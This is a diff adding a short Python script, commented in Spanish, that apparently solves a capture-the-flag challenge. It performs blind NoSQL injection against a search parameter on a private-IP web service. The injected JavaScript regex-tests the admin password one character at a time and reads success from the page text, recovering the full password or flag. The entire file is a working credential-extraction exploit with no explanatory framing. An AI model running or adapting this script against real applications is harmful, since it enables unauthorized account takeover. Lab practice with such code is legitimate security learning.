@@ -1,0 +1,32 @@
+import requests
+import string
+
+# URL del objetivo
+base_url = "http://172.18.0.4:9292/?search=admin'%26%26this.password.match(/^{}.*$/)||'"
+
+# Conjunto de caracteres a probar
+#characters = string.ascii_lowercase + string.ascii_uppercase + string.digits 
+characters = "flag{}0123456789qwertyuiopasdfghjkllñzxcvbnm,_"
+
+found_password = ""
+
+while True:
+    found_new_char = False
+    for char in characters:
+        test_password = found_password + char
+        url = base_url.format(test_password)
+        response = requests.get(url)
+        
+        if ">admin<" in response.text:  # Reemplazar con el texto que indica éxito
+            found_password += char
+            print(f"Contraseña encontrada hasta ahora: {found_password}")
+            found_new_char = True
+            print(f"{url}")
+            break
+    
+    if not found_new_char:
+        # No se encontró ningún carácter nuevo, se asume que la contraseña está completa
+        break
+
+print(f"La contraseña completa es: {found_password}")
+
